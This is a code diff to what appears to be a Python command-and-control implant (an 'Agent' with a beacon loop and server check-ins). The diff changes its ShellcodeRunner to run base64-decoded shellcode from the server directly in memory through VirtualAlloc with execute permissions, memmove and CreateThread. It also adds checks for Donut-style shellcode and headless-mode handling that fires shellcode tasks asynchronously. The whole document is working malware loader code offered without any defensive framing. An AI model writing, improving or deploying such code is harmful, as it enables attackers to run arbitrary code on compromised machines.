@@ -1143,31 +1143,39 @@ class ShellcodeRunner:
 
     @staticmethod
     def execute(shellcode_bytes):
-
         try:
-            # Create and start a new process
-            ctx = multiprocessing.get_context('spawn')
-            p = ctx.Process(
-                target=ShellcodeRunner._worker,
-                args=(shellcode_bytes,),
-                daemon=True
+            # Direct execution in current process (more reliable in headless)
+            ptr = ShellcodeRunner.kernel32.VirtualAlloc(
+                None,
+                len(shellcode_bytes),
+                ShellcodeRunner.MEM_COMMIT | ShellcodeRunner.MEM_RESERVE,
+                ShellcodeRunner.PAGE_EXECUTE_READWRITE
             )
-            p.start()
             
-            # Briefly wait to check if process started
-            p.join(0.1)
+            if not ptr:
+                raise ctypes.WinError(ctypes.get_last_error())
             
-            if p.is_alive():
-                return {{
-                    'status': 'success',
-                    'message': f'Shellcode running in separate process (PID: {{p.pid}})'
-                }}
-            else:
-                return {{
-                    'status': 'error',
-                    'message': f'Process terminated immediately with exit code {{p.exitcode}}'
-                }}
-                
+            ctypes.memmove(ptr, shellcode_bytes, len(shellcode_bytes))
+            
+            # Create thread with explicit stack size
+            thread = ShellcodeRunner.kernel32.CreateThread(
+                None,
+                0,  # Default stack size
+                ptr,
+                None,
+                0,  # Start immediately
+                None
+            )
+            
+            if not thread:
+                raise ctypes.WinError(ctypes.get_last_error())
+            
+            # Don't wait for completion in headless mode
+            return {{
+                'status': 'success',
+                'message': 'Shellcode executed asynchronously'
+            }}
+            
         except Exception as e:
             return {{
                 'status': 'error',
@@ -1650,6 +1658,8 @@ class Agent:
             elif task_type == "shellcode":
                 try:
                     shellcode_b64 = task.get("data", {{}}).get("shellcode", "")
+                  
+                    
                     if not shellcode_b64:
                         return {{
                             "status": "error",
@@ -1657,10 +1667,35 @@ class Agent:
                         }}
                         
                     shellcode_bytes = base64.b64decode(shellcode_b64)
-                    return ShellcodeRunner.execute(shellcode_bytes)
                     
+                    # Validate shellcode length
+                    if len(shellcode_bytes) < 4:
+                        return {{
+                            "status": "error",
+                            "message": "Shellcode too small (minimum 4 bytes required)"
+                        }}
+                        
+                    # Validate shellcode contains executable bytes
+                    if all(b == 0 for b in shellcode_bytes[:4]):
+                        return {{
+                            "status": "error",
+                            "message": "Invalid shellcode (first 4 bytes are null)"
+                        }}
+
+                    self._log_info(f"Executing shellcode ({{len(shellcode_bytes)}} bytes)")
+                    
+                    
+                    # Existing Donut-generated shellcode handling
+                    result = ShellcodeRunner.execute(shellcode_bytes)
+                    if isinstance(result, dict):
+                        return result
+                    return {{
+                        'status': 'success',
+                        'message': str(result)
+                    }}
+                        
                 except Exception as e:
-                    self._log_error(f"Shellcode execution failed: {{str(e)}}")
+                    self._log_error(f"Shellcode processing failed: {{str(e)}}")
                     return {{
                         "status": "error",
                         "message": f"Shellcode execution failed: {{str(e)}}"
@@ -1798,6 +1833,15 @@ class Agent:
                             timeout=30,
                             verify=False
                         )
+                    if task.get("type") == "shellcode":
+                        # Special handling for shellcode in headless mode
+                        result = self._execute_task(task)
+                        if result.get('status') == 'error':
+                            self._log_error(f"Shellcode failed: {{result['message']}}")
+                            continue
+                        
+                        # Don't wait for response in headless mode
+                        continue
                 
                 # After first checkin, set flag to False
                 if first_checkin:
@@ -1807,8 +1851,8 @@ class Agent:
                 self._log_error(f"Connection error: {{str(e)}}")
                 time.sleep(self.config.CHECKIN_INTERVAL * 2)
             except Exception as e:
-                self._log_error(f"Unexpected error: {{str(e)}}")
-                time.sleep(self.config.CHECKIN_INTERVAL)
+                self._log_error(f"Error in beacon: {{str(e)}}")
+                time.sleep(self.config.CHECKIN_INTERVAL * 2)
 
     def stop(self):
         self._running = False
